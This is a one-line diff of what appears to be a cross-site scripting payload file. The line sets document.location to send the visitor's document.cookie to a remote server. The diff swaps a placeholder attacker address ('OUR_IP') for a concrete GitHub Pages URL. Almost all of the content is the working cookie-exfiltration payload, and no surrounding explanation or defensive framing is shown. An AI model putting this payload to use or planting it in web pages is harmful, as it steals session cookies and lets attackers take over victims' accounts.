@@ -1,1 +1,1 @@
-document.location='http://OUR_IP/index.php?c='+document.cookie;
+document.location='https://giovanniocasio.github.io/404GioNotFound/index.php?c='+document.cookie;
